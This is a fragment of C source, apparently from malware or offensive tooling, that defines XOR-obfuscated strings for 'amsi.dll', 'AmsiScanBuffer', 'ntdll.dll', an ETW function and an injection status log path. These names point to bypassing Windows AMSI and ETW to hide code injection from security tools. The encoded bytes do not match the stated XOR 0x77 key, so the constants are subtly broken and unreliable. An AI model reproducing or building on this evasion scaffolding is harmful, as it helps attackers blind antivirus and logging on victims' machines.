...
static const unsigned char xAmsiDll[] = {
    0xBE, 0xB2, 0xAC, 0xB6, 0xF1, 0xBB, 0xB3, 0xB3
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" XOR 0x77 */
static const unsigned char xAmsiFunc[] = {
    0x9E, 0xB2, 0xAC, 0xB6, 0x8C, 0xBC, 0xBE, 0xB1,
    0x9D, 0xAA, 0xB9, 0xB9, 0xBA, 0xAD
};
#define xAmsiFunc_LEN 14

/* "ntdll.dll" XOR 0x77 */
static const unsigned char xNtdll[] = {
    0xB1, 0xAB, 0xBB, 0xB3, 0xB3, 0xF1, 0xBB, 0xB3,
    0xB3
};
#define xNtdll_LEN 9
...
static const unsigned char xEtwFunc[] = {
    0x9A, 0xAB, 0xA8, 0x9A, 0xA9, 0xBA, 0xB1, 0xAB,
    0x88, 0xAD, 0xB6, 0xAB, 0xBA
};
#define xEtwFunc_LEN 13

/* "C:\Windows\Temp\inject_status.log" XOR 0x77 */
static const unsigned char xCanaryPath[] = {
    0x9C, 0xE5, 0x83, 0x88, 0xB6, 0xB1, 0xBB, 0xB0,
    0xA8, 0xAC, 0x83, 0x8B, 0xBA, 0xB2, 0xAF, 0x83,
    0xB6, 0xB1, 0xB5, 0xBA, 0xBC, 0xAB, 0x80, 0xAC,
    0xAB, 0xBE, 0xAB, 0xAA, 0xAC, 0xF1, 0xB3, 0xB0,
    0xB8
};
